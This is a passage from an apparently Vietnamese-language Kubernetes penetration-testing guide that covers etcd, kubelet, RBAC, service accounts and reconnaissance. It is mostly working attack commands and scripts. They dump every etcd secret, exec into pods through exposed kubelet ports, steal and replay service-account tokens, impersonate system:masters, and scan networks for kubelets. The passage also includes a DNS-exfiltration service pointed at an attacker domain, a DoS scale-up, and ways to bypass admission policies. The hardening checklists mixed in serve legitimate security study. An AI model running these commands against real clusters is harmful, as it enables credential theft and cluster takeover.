**Token brute-force?** Không — API server rate-limits và tokens là JWT với signature. Nhưng nếu có `system:anonymous` bound với cluster-admin role (sai config), thì full access.

#### 12.2 etcd (Port 2379/2380)

etcd là **key-value store** chứa TOÀN BỘ cluster state: secrets, configmaps, RBAC policies, pod specs, service accounts.

**Attack vectors:**
- **No auth:** `ETCDCTL_API=3 etcdctl --endpoints=<etcd>:2379 get / --prefix --keys-only`
- **No TLS:** etcd listen trên port 2379 (client), 2380 (peer) — nếu không có TLS
- **Client cert:** Nếu có cert, có thể authenticate

**Dump all secrets from etcd:**
```bash
export ETCDCTL_API=3

# If no auth
etcdctl --endpoints=https://<etcd>:2379 get /registry/secrets/ --prefix

# If cert auth
etcdctl --endpoints=https://<etcd>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/ --prefix

# Dump everything
etcdctl get / --prefix --keys-only > /tmp/etcd-keys.txt

# Export all data as JSON
etcdctl get / --prefix --write-out=json > /tmp/etcd-dump.json
```

**etcd key structure:**
```
/registry/secrets/<namespace>/<secret-name>
/registry/configmaps/<namespace>/<configmap-name>
/registry/pods/<namespace>/<pod-name>
/registry/deployments/<namespace>/<deploy-name>
/registry/services/specs/<namespace>/<service-name>
/registry/serviceaccounts/<namespace>/<sa-name>
/registry/roles/<namespace>/<role-name>
/registry/rolebindings/<namespace>/<rb-name>
/registry/clusterroles/<clusterrole-name>
/registry/clusterrolebindings/<clusterrolebinding-name>
/registry/minions/<node-name>
```

**etcd security checklist:**
- [ ] TLS enabled cho client communication
- [ ] TLS enabled cho peer communication
- [ ] Authentication enabled (client certs)
- [ ] Network restricted (not public)
- [ ] Firewall on port 2379/2380
- [ ] etcd chỉ accessible từ API server (trong production)

#### 12.3 kube-scheduler

Scheduler quyết định pod chạy trên node nào. Nếu compromise scheduler:
- Schedule pods để tránh detection
- Schedule pods vào node attacker đã compromise
- Tạo fake node để intercept pods

**Attack: Scheduler欺骗 (Scheduler spoofing):**
Nếu attacker có thể tạo `PriorityClass` với priority cao và schedule pod vào node đã compromise:
```bash
cat <<EOF | kubectl apply -f -
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: high-priority
value: 1000000
globalDefault: false
description: "High priority for special workloads"
EOF

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  priorityClassName: high-priority
  nodeName: compromised-node
  containers:
  - name: attacker
    image: ubuntu:latest
    command: ["sleep", "3600"]
EOF
```

#### 12.4 kube-controller-manager

Controller manager chạy các controllers: Node Controller, Replication Controller, Endpoints Controller, Service Account & Token Controllers, etc.

**Attack vectors:**
- Nếu controller manager flags: `--enable-hostpath-provisioner=true` — allow hostPath volumes
- Nếu `--service-account-private-key-file` compromised — có thể forge service account tokens

### 13. Worker Node Components

#### 13.1 kubelet (Port 10250, 10255)

kubelet là **node agent** — chạy trên mọi worker node, quản lý pods.

**kubelet ports:**
- **10250:** Authenticated kubelet API (HTTPS, yêu cầu client cert hoặc token)
- **10255:** Read-only kubelet API (HTTP, không auth — deprecated nhưng vẫn tồn tại)
- **10248:** Healthz endpoint
- **10249:** kube-proxy metrics

**kubelet API endpoints:**
```bash
# Read-only (10255) - should not exist in production
curl http://node:10255/pods
curl http://node:10255/spec/
curl http://node:10255/stats/summary

# Authenticated (10250)
# Check auth
curl -k https://node:10250/pods

# Lấy pod logs
curl -k https://node:10250/containerLogs/<namespace>/<pod>/<container>

# Exec into container
curl -k -X POST https://node:10250/exec/<ns>/<pod>/<container>?command=bash&input=1&output=1&tty=1

# Run command
curl -k -X POST https://node:10250/run/<ns>/<pod>/<container> -d "cmd=id"

# Port forwarding
curl -k -X POST https://node:10250/portForward/<ns>/<pod>
```

**Authenticating to kubelet:**
kubelet supports: x509 client certs, bearer tokens, webhook authentication.

```bash
# If you have a node's kubelet client cert
curl -k --cert kubelet-client.crt --key kubelet-client.key https://node:10250/pods

# If you have a service account token
curl -k -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" https://node:10250/pods

# If kubelet configured with --anonymous-auth=true
curl -k https://node:10250/pods  # May work!
```

**kubeletctl** (tool chuyên cho kubelet exploitation):
```bash
# Scan nodes for open kubelet ports
kubeletctl scan --cidr 10.0.0.0/8

# Check anonymous access
kubeletctl -i <node> pods

# Exec command on pod
kubeletctl -i <node> exec "id" -p <pod> -c <container>

# Port forward
kubeletctl -i <node> port-forward <pod> 8080:80 -c <container>

# List all capabilities
kubeletctl -i <node> metrics
```

#### 13.2 kube-proxy

Network proxy chạy trên mỗi node, quản lý iptables/IPVS rules cho Services.

**Attack:**
- Nếu attacker có access vào node, có thể manipulate iptables rules
- Redirect traffic từ service đến malicious endpoint
- kube-proxy thường chạy với `privileged: true` hoặc `CAP_NET_ADMIN`
- Nếu compromise được kube-proxy → full network control

### 14. Kubernetes Objects — Góc Nhìn Hacker

#### 14.1 Pod

Đơn vị nhỏ nhất. Một hoặc nhiều containers chia sẻ network, storage.

**Attack surface của Pod:**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
spec:
  # Container-level security context
  containers:
  - name: app
    image: nginx:latest
    securityContext:
      privileged: true                    # 🚨 Full host access
      allowPrivilegeEscalation: true      # 🚨 Can become root
      capabilities:
        add: ["SYS_ADMIN", "SYS_PTRACE"]  # 🚨 Dangerous caps
      runAsUser: 0                        # 🚨 Runs as root
      readOnlyRootFilesystem: false
    volumeMounts:
    - mountPath: /host
      name: host-root
    - mountPath: /var/run/docker.sock    # 🚨 Docker socket
      name: docker-sock
  # Pod-level security context
  securityContext:
    runAsUser: 0                          # 🚨 Pod runs as root
    fsGroup: 0
    seccompProfile:
      type: Unconfined                    # 🚨 No seccomp
    seLinuxOptions:
      type: spc_t                         # 🚨 SELinux unconfined
  volumes:
  - name: host-root
    hostPath:                             # 🚨 Host filesystem
      path: /
      type: Directory
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock         # 🚨 Docker socket
  hostPID: true                           # 🚨 See host processes
  hostNetwork: true                       # 🚨 Use host network
  hostIPC: true                           # 🚨 Access host IPC
  nodeName: worker-1                      # Pod cụ thể trên 1 node
  serviceAccountName: cluster-admin       # 🚨 High privilege SA
```

**Pod exec (đã authenticated):**
```bash
# From kubectl
kubectl exec -it <pod> -- bash

# Direct API call
curl -k -X POST \
  -H "Authorization: Bearer <token>" \
  -H "Connection: Upgrade" \
  -H "Upgrade: SPDY/3.1" \
  "https://<api-server>:6443/api/v1/namespaces/default/pods/<pod>/exec?command=bash&stdin=true&stdout=true&stderr=true&tty=true"
```

#### 14.2 Deployment

ReplicaSet + Pod template. Declarative updates.

**Attack:**
- Tạo deployment với image đã compromise
- Scale deployment để consume resources (DoS)
- Rollback deployment để restore old (potentially vulnerable) version

```bash
# Deploy malicious workload
kubectl create deployment malicious --image=malicious:latest

# Scale up for DoS
kubectl scale deployment malicious --replicas=100

# Rollback to vulnerable version
kubectl rollout undo deployment/legitimate-app --to-revision=1
```

#### 14.3 Service

Network abstraction — load balancing giữa pods.

**Attack:**
- ExternalName service → DNS rebinding
- NodePort service → expose internal service ra ngoài
- Service không có network policy → unrestricted access

```yaml
# ExternalName service — có thể dùng cho exfiltration qua DNS
apiVersion: v1
kind: Service
metadata:
  name: exfil-service
spec:
  type: ExternalName
  externalName: attacker-controlled-domain.com  # DNS query!
```

#### 14.4 ConfigMap & Secret

**ConfigMap:** Lưu cấu hình không nhạy cảm.
**Secret:** Lưu dữ liệu nhạy cảm (base64 encoded — không phải encrypted!).

```bash
# List secrets (cần permission)
kubectl get secrets -n <namespace>

# Decode secret
kubectl get secret <name> -o jsonpath='{.data}' | jq 'map_values(@base64d)'

# Get all secrets from all namespaces (if have permission)
kubectl get secrets --all-namespaces -o json | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, data: .data | map_values(@base64d)}'
```

**Secret attack vectors:**
- Secrets thường được base64 encode, không encrypt mặc định
- Nếu có access vào etcd → đọc tất cả secrets
- Nếu có `get` secret permission → đọc tất cả
- Secrets được mount vào pod dưới dạng file hoặc env vars
- Container compromise → secret leak

**Protection:** Enable **encryption at rest** cho Secrets:
```yaml
# /etc/kubernetes/manifests/kube-apiserver.yaml
--encryption-provider-config=/etc/kubernetes/encryption-config.yaml
```

```yaml
# encryption-config.yaml
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
  - resources:
    - secrets
    providers:
    - aescbc:
        keys:
        - name: key1
          secret: <base64-32-byte-key>
    - identity: {}  # fallback
```

#### 14.5 ServiceAccount

ServiceAccount = identity cho non-human actors (pods, services).

```yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-sa
  namespace: default
secrets:
- name: my-sa-token-xxxxx
```

**Service account token:** Mounted tại `/var/run/secrets/kubernetes.io/serviceaccount/` trong mọi pod.

```bash
# Inside any pod
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
# Output:
# ca.crt        → Cluster CA certificate
# namespace     → Current namespace
# token         → JWT token for this service account

# Read token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token to access API server
K8S_API_SERVER="${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_6443}"
curl -k --cacert $CA -H "Authorization: Bearer $TOKEN" https://$K8S_API_SERVER/api/v1/namespaces/$NAMESPACE/pods
```

**JWT token decode:**
```bash
# Decode JWT (không verify signature)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
# Payload contains:
# {
#   "iss": "kubernetes/serviceaccount",
#   "kubernetes.io/serviceaccount/namespace": "default",
#   "kubernetes.io/serviceaccount/secret.name": "default-token-xxxxx",
#   "kubernetes.io/serviceaccount/service-account.name": "default",
#   "kubernetes.io/serviceaccount/service-account.uid": "xxxx",
#   "sub": "system:serviceaccount:default:default"
# }
```

**Token rotation & bound service account tokens:**
- K8s 1.21+: TokenRequest API → time-bound, audience-bound tokens
- K8s 1.24+: Legacy auto-mounted tokens removed! Must use TokenRequest
- Bound tokens: `sub` claim contains pod identity, không thể dùng từ pod khác

#### 14.6 RBAC — Role & RoleBinding / ClusterRole & ClusterRoleBinding

Đây là **trọng tâm của privilege escalation** trong K8s.

**Role (namespaced) vs ClusterRole (cluster-wide):**
```yaml
# Role — chỉ trong namespace "default"
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-reader
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list", "watch"]

# ClusterRole — toàn cluster
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: cluster-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

**RoleBinding & ClusterRoleBinding:**
```yaml
# RoleBinding — gán role vào user/SA trong namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: read-pods
  namespace: default
subjects:
- kind: ServiceAccount
  name: my-sa
  namespace: default
roleRef:
  kind: Role
  name: pod-reader
  apiGroup: rbac.authorization.k8s.io

# ClusterRoleBinding — gán cluster-wide permission
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-binding
subjects:
- kind: ServiceAccount
  name: my-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

**Verbs in RBAC:**
| Verb | Meaning | Risk |
|------|---------|------|
| `get` | Read specific resource | Enumeration |
| `list` | List all resources | Enumeration |
| `create` | Create resource | Privilege escalation |
| `update` | Update resource | Modify existing |
| `patch` | Partial update | Modify existing |
| `delete` | Delete resource | DoS |
| `watch` | Watch changes | Monitoring |
| `escalate` | **Can override RBAC** | 🚨 Full cluster admin |
| `impersonate` | **Can impersonate other users** | 🚨 Privilege escalation |
| `bind` | **Can create RoleBindings** | 🚨 Privilege escalation |

**Default dangerous roles:**
- `cluster-admin` — Superuser access to everything
- `admin` — Admin of namespace
- `edit` — Can edit most resources
- `view` — Read-only
- `system:masters` — Group có full access

**Special `system:` groups:**
- `system:authenticated` — All authenticated users
- `system:unauthenticated` — All unauthenticated users (anonymous)
- `system:serviceaccounts` — All service accounts
- `system:serviceaccount:<ns>:<name>` — Specific SA
- `system:nodes` — All nodes
- `system:masters` — **Full access** (default group for admin cert)

**Cụm bind cluster-admin cho anonymous (siêu nguy hiểm):**
```yaml
# NẾU config này tồn tại → bất kỳ ai cũng là cluster admin
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: anonymous-admin
subjects:
- kind: User
  name: system:anonymous
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

#### 14.7 Ingress

Ingress = HTTP/S load balancer — expose services ra ngoài cluster.

**Attack vectors:**
- **Path traversal:** Misconfigured Ingress cho phép access paths không intended
- **TLS termination:** Nếu Ingress terminates TLS, traffic đến service là plain HTTP
- **Annotation injection:** Nếu attacker có `create ingress` permission, có thể inject annotations để redirect traffic
- **SSRF:** Ingress controller thường có network access tới internal services

```yaml
# Malicious ingress — redirect traffic
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: malicious-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /internal-api
    nginx.ingress.kubernetes.io/backend-protocol: "HTTPS"
spec:
  rules:
  - host: app.example.com
    http:
      paths:
      - path: /api
        pathType: Prefix
        backend:
          service:
            name: internal-api  # Expose internal service
            port:
              number: 80
```

#### 14.8 NetworkPolicy

NetworkPolicy = Kubernetes-native firewall cho pods.

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: default
spec:
  podSelector: {}           # Select all pods
  policyTypes:
  - Ingress
  - Egress
```

**Attack/Evaluation:**
- Nếu không có NetworkPolicy → mọi pod có thể communicate với mọi pod khác
- NetworkPolicy chỉ được implement bởi CNI plugin (Calico, Cilium, Weave, etc.)
- Nếu CNI không support (flannel default) → NetworkPolicy không hoạt động
- Default: **allow all** — zero security

**Check if NetworkPolicy is effective:**
```bash
# Check CNI plugin
kubectl get pods -n kube-system | grep -E "calico|cilium|weave|flannel"

# Check if any NetworkPolicy exists
kubectl get networkpolicies --all-namespaces

# Test connectivity between pods
kubectl run test1 --image=alpine -- sleep 3600
kubectl run test2 --image=alpine -- sleep 3600
kubectl exec test1 -- ping <test2-ip>
```

#### 14.9 PodSecurityPolicy (PSP) — Deprecated → Pod Security Admission (PSA)

**PSP (removed in 1.25):** Cluster-level resource controls pod security contexts.
**PSA (stable in 1.25):** Built-in admission controller với 3 tiers.

**PSA Modes:**
| Mode | Description | Labels |
|------|-------------|--------|
| **Privileged** | No restrictions | `pod-security.kubernetes.io/enforce=privileged` |
| **Baseline** | Minimal restrictions (prevents known escalations) | `pod-security.kubernetes.io/enforce=baseline` |
| **Restricted** | Strictest (pod must follow hardened guidelines) | `pod-security.kubernetes.io/enforce=restricted` |

**PSA enforcement levels:**
- `enforce` — Block non-compliant pods
- `audit` — Log violations but don't block
- `warn` — Warn user but don't block

```bash
# Check PSA on namespace
kubectl label --dry-run=server ns default \
  pod-security.kubernetes.io/enforce=restricted

# Apply PSA
kubectl label ns production \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=baseline \
  pod-security.kubernetes.io/warn=baseline

# Verify
kubectl describe ns production
```

**Restricted pod security:** Cấm:
- `privileged: true`
- `hostPID`, `hostNetwork`, `hostIPC`
- `hostPort`
- `allowPrivilegeEscalation: true`
- Root filesystem writable
- Non-trusted seccomp
- `capabilities.add` (trừ `NET_BIND_SERVICE`)
- `runAsUser: 0`

#### 14.10 OPA/Gatekeeper & Kyverno

**Open Policy Agent (OPA) Gatekeeper:** Admission controller dùng Rego policies.
**Kyverno:** Policy engine với Kubernetes-native YAML policies.

**OPA/Gatekeeper bypass techniques:**
1. **Policy doesn't cover all cases:** Ví dụ policy check image registry prefix nhưng attacker dùng tag mutation
2. **Race condition:** Exploit timing between admission review and runtime
3. **Kuberenetes API abuse:** Gọi API với parameters làm bypass policy
4. **CRD manipulation:** Tạo CRD làm policy không match

**Kyverno bypass:**
- Policy chỉ apply trên `CREATE`, không apply trên `UPDATE`
- Dùng `kubectl replace` thay vì create
- Các mutations không bị policy kiểm tra
- Exceptions / exclusions có thể bị abuse

### 15. Authentication & Authorization Chi Tiết

#### 15.1 Authentication Methods

| Method | Mechanism | Certs/Keys | Notes |
|--------|-----------|-----------|-------|
| **X509 Client Certs** | TLS mutual auth | CA-signed client certs | Common for admin access |
| **Bearer Tokens** | JWT tokens | Secret key or public key | Service accounts + OIDC |
| **Static Token File** | CSV file with tokens | Shared secret | Deprecated, không nên dùng |
| **Bootstrap Tokens** | Short-lived tokens | Used for node joining | |
| **OIDC** | OpenID Connect | External IdP | Google, Azure AD, Okta |
| **Webhook** | External auth service | TokenReview API | Custom auth |
| **Anonymous** | No auth | None | Should be disabled |
| **ServiceAccount** | JWT token | Private key | Pod identity |

**Client cert authentication:**
```bash
# Generate admin cert
openssl x509 -in /etc/kubernetes/pki/admin.crt -text -noout

# Use cert
kubectl --client-certificate=admin.crt --client-key=admin.key get pods

# Or add to kubeconfig
kubectl config set-credentials admin \
  --client-certificate=admin.crt \
  --client-key=admin.key
```

#### 15.2 Authorization Modes

1. **Node** — Authorize kubelet requests (always on)
2. **RBAC** — Role-based (standard)
3. **ABAC** — Attribute-based (deprecated, JSON policy files)
4. **Webhook** — External authorization service

**SubjectAccessReview API:**
```bash
# Check if you can do something
kubectl auth can-i create deployments
kubectl auth can-i list secrets -n kube-system
kubectl auth can-i '*' '*' --all-namespaces

# SelfSubjectAccessReview
cat <<EOF | kubectl apply -f -
apiVersion: authorization.k8s.io/v1
kind: SelfSubjectAccessReview
spec:
  resourceAttributes:
    namespace: default
    verb: create
    resource: pods
EOF
```

**Impersonate header:**
```bash
# Nếu có `impersonate` permission, có thể làm người khác
kubectl --as=system:admin --as-group=system:masters get pods

# API call
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: system:admin" \
  -H "Impersonate-Group: system:masters" \
  https://<api-server>:6443/api/v1/pods
```

### 16. Service Mesh Basics

Service mesh như **Istio, Linkerd, Consul Connect** thêm security layer.

#### 16.1 mTLS (Mutual TLS)

- Mỗi pod có sidecar proxy (Envoy cho Istio, linkerd-proxy cho Linkerd)
- Traffic giữa pods được encrypt và authenticate mTLS
- mTLS certificates tự động rotated
- **Attack:** Nếu compromise sidecar, có thể intercept/decrypt traffic

#### 16.2 Sidecar Injection

```yaml
# Pod với Istio sidecar injected
apiVersion: v1
kind: Pod
metadata:
  labels:
    sidecar.istio.io/inject: "true"
spec:
  containers:
  - name: app
    image: myapp:latest
  - name: istio-proxy    # Sidecar — intercepts all traffic
    image: istio/proxyv2:1.18.0
```

**Attack on sidecar:**
- Nếu có `patchnamespace` hoặc `patchpod`, có thể inject sidecar vào pod khác
- pdate pod label để auto-inject hoặc remove sidecar
- Sidecar có thể intercept, redirect, hoặc drop traffic

---

## D. K8S RECON & ENUMERATION

### 17. kubeconfig Discovery

kubeconfig files chứa credentials (tokens, client certs) để access Kubernetes cluster.

**Common paths:**
```bash
~/.kube/config                     # Default
~/.kube/config-<context>
$KUBECONFIG                        # Env var
/etc/kubernetes/admin.conf         # kubeadm
/etc/kubernetes/kubelet.conf       # kubelet
/etc/kubernetes/controller-manager.conf
/etc/kubernetes/scheduler.conf
/var/lib/kubelet/kubeconfig
/root/.kube/config
/var/lib/rancher/rke2/server/cred/admin.kubeconfig  # RKE2
/etc/rancher/k3s/k3s.yaml                            # K3s
/etc/eks/cluster/config                              # EKS
```

**Parse kubeconfig:**
```bash
# Default kubeconfig
cat ~/.kube/config

# Extract server URL
kubectl config view -o jsonpath='{.clusters[0].cluster.server}'

# Extract token
kubectl config view --raw -o json | jq -r '.users[0].user.token'

# Extract client cert data
kubectl config view --raw -o json | jq -r '.users[0].user["client-certificate-data"]' | base64 -d

# List contexts
kubectl config get-contexts

# Switch context
kubectl config use-context <context>

# Merge kubeconfigs
export KUBECONFIG=~/.kube/config:~/.kube/config-eks
kubectl config view --flatten > ~/.kube/config-merged
```

**Enumeration script:**
```bash
#!/bin/bash
# kubeconfig-discovery.sh
KUBECONFIG_PATHS=(
  "/etc/kubernetes/admin.conf"
  "/etc/kubernetes/kubelet.conf"
  "/etc/kubernetes/scheduler.conf"
  "/etc/kubernetes/controller-manager.conf"
  "/root/.kube/config"
  "/home/*/.kube/config"
  "/var/lib/kubelet/kubeconfig"
  "/etc/rancher/k3s/k3s.yaml"
  "/etc/eks/cluster/config"
  "/etc/kubernetes/super-admin.conf"
)

echo "=== Kubeconfig Discovery ==="
for path in "${KUBECONFIG_PATHS[@]}"; do
  # Expand glob
  for f in $path; do
    if [ -f "$f" ]; then
      echo "[+] Found: $f"
      SERVER=$(grep "server:" "$f" 2>/dev/null | awk '{print $2}')
      echo "    Server: $SERVER"
    fi
  done
done

# Also search entire filesystem
echo ""
echo "=== Full filesystem search ==="
find / -name "kubeconfig" -o -name "*.kubeconfig" -o -name "admin.conf" 2>/dev/null
find / -name "config" -path "*/.kube/*" 2>/dev/null
```

### 18. API Server Discovery

#### 18.1 External Discovery (from outside the cluster)

**DNS records:**
```bash
# Common K8s API DNS
nslookup kubernetes.default.svc.cluster.local
nslookup api.cluster.local
nslookup k8s-api.example.com
nslookup cluster.example.com
```

**Shodan / Censys:**
```
port:6443 product:"Kubernetes"
port:6443 "kind: PodList"
port:6443 "apiVersion"
port:443 "kubernetes" "oauth2"
```

**Certificate transparency:**
```bash
# Search crt.sh for Kubernetes API certificates
curl -s "https://crt.sh/?q=kubernetes&output=json" | jq -r '.[].name_value' | sort -u
curl -s "https://crt.sh/?q=k8s&output=json" | jq -r '.[].name_value' | sort -u
```

**Cloud metadata services:**
```bash
# GKE — metadata
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name

# EKS — environment
env | grep -i kubernetes
env | grep -i k8s
env | grep -i cluster

# AKS — environment
env | grep -i azure
env | grep -i kubernetes
```

#### 18.2 Internal Discovery (from inside a pod)

**Environment variables (set by Kubernetes for every pod):**
```bash
# Inside any pod
env | grep -i kubernetes

# Output:
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443
# KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
# KUBERNETES_PORT_443_TCP_PROTO=tcp
# KUBERNETES_PORT_443_TCP_PORT=443
# KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
# KUBERNETES_PORT=tcp://10.96.0.1:443

# Also check service-specific env vars (if service exists)
env | grep -i SERVICE
```

**DNS discovery of API server:**
```bash
# From inside pod, DNS resolves kubernetes.default.svc
nslookup kubernetes.default.svc
# Server:    10.96.0.10 (CoreDNS)
# Address 1: 10.96.0.1 kubernetes.default.svc.cluster.local
```

**API Server reachability test:**
```bash
K8S_API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Try anonymous access first
curl -k $K8S_API/api/v1/pods 2>/dev/null

# Try with namespace
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -k --cacert $CA -H "Authorization: Bearer $TOKEN" $K8S_API/api/v1/namespaces/$NAMESPACE/pods

# Check version
curl -k $K8S_API/version

# Check available API groups
curl -k $K8S_API/apis
curl -k $K8S_API/api/v1
```

### 19. kubelet API Enumeration

kubelet API là goldmine cho recon vì nó exposes pod info, metrics, và có thể exec.

**Scan open kubelet ports:**
```bash
# Scan node CIDR
for port in 10250 10255; do
  for ip in $(seq 1 254); do
    timeout 2 bash -c "echo >/dev/tcp/10.0.0.$ip/$port" 2>/dev/null && \
      echo "[+] 10.0.0.$ip:$port open"
  done
done

# Faster with masscan/nmap
masscan 10.0.0.0/8 -p10250,10255 --rate=1000 -oG kubelet-scan.txt
```

**kubelet API endpoints:**
```bash
# Node info
curl -k https://node:10250/node
curl -k https://node:10250/metrics

# Pod list (most important!)
curl -k https://node:10250/pods | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace, node: .spec.nodeName}'

# Pod logs
curl -k https://node:10250/containerLogs/default/nginx-pod/nginx

# Running containers
curl -k https://node:10250/runningpods/
```

**kubeletctl in action:**
```bash
# Auto-discover and test kubelets
kubeletctl scan --cidr 192.168.1.0/24

# Test anonymous access
kubeletctl -i 192.168.1.100 pods

# Get full pod info
kubeletctl -i 192.168.1.100 pods -v

# Run command
kubeletctl -i 192.168.1.100 exec "env" -p nginx-pod -c nginx
```

### 20. etcd Discovery & Access

**Find etcd from node:**
```bash
# Process listing
ps aux | grep etcd

# From kube-system pods
kubectl get pods -n kube-system | grep etcd

# Check for etcd client certs
find /etc/kubernetes/pki/etcd/ -type f 2>/dev/null
ls -la /etc/kubernetes/pki/etcd/

# etcd manifests (if static pod)
cat /etc/kubernetes/manifests/etcd.yaml 2>/dev/null

# Network scan
nmap -p2379,2380 <node-ip>
```

**Access etcd từ node:**
```bash
# With certs
export ETCDCTL_API=3
etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  endpoint health

# Dump all
etcdctl get / --prefix --keys-only > /tmp/etcd-all-keys.txt

# Extract secrets
etcdctl get /registry/secrets --prefix --keys-only | while read key; do
  etcdctl get "$key" --print-value-only | base64 -d 2>/dev/null
done
```

### 21. RBAC Enumeration

**From kubectl:**
```bash
# Check your identity
kubectl auth whoami

# Check specific permissions
kubectl auth can-i list secrets
kubectl auth can-i create pods
kubectl auth can-i create deployments
kubectl auth can-i list clusterroles
kubectl auth can-i bind cluster-admin --all-namespaces
kubectl auth can-i '*' '*' --all-namespaces

# List all permissions (systematic)
for verb in get list create update patch delete watch; do
  for resource in pods deployments secrets configmaps services roles rolebindings clusterroles clusterrolebindings nodes serviceaccounts pv pvc; do
    kubectl auth can-i $verb $resource --all-namespaces 2>/dev/null | grep -v "no" && echo "  $verb $resource: YES"
  done
done
```

**Access-matrix tool:**
```bash
# kubeaudit RBAC
kubeaudit rbac

# Access Matrix (kubectl plugin)
kubectl access-matrix --namespace default
```

**RBAC enumeration script (no kubectl, direct API):**
```bash
#!/bin/bash
# rbac-enum.sh — check permissions via API

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

check_access() {
  local verb=$1
  local resource=$2
  local ns=${3:-$NAMESPACE}

  if [ "$ns" = "--all-namespaces" ]; then
    ns=""
    resourceAttr='"namespace": "", "resource": "'$resource'"'
  else
    resourceAttr='"namespace": "'$ns'", "resource": "'$resource'"'
  fi

  RESP=$(curl -sk -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{
      \"apiVersion\": \"authorization.k8s.io/v1\",
      \"kind\": \"SelfSubjectAccessReview\",
      \"spec\": {
        \"resourceAttributes\": {
          $resourceAttr,
          \"verb\": \"$verb\"
        }
      }
    }" \
    $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews)

  ALLOWED=$(echo "$RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('status',{}).get('allowed', False))" 2>/dev/null)
  if [ "$ALLOWED" = "True" ]; then
    echo "[+] $verb $resource (ns:$ns)"
  fi
}

echo "=== RBAC Enumeration ==="
echo "Using SA: $(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('sub','unknown'))" 2>/dev/null)"
echo ""

for verb in get list watch create update patch delete; do
  for resource in pods deployments secrets configmaps services roles rolebindings clusterroles clusterrolebindings nodes serviceaccounts persistentvolumes persistentvolumeclaims; do
    check_access $verb $resource
    check_access $verb $resource "--all-namespaces"
  done
done
```

### 22. Service Account Token Discovery

**Inside a pod:**
```bash
# Default mount path
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Read the token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check what namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Check if token is mounted (look for volumes)
mount | grep serviceaccount
mount | grep secret

# If no token mounted, check if automountServiceAccountToken: false
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep KUBERNETES
```

**Find tokens on host filesystem:**
```bash
# On host (if you have access)
find /var/lib/kubelet/pods/ -name "token" -exec cat {} \; 2>/dev/null

# In kubeconfigs
grep -r "authorization-bearer" /var/lib/kubelet/ 2>/dev/null
grep -r "token:" /etc/kubernetes/ 2>/dev/null

# In pod volumes
find /var/lib/kubelet/pods/ -name "token" 2>/dev/null
```

**Service account listing (with permissions):**
```bash
# List all service accounts
kubectl get serviceaccounts --all-namespaces

# Get detailed SA info
kubectl get serviceaccount <name> -n <ns> -o yaml

# Check SA secrets
kubectl get secrets -n <ns> | grep <sa-name>

# Decode SA token
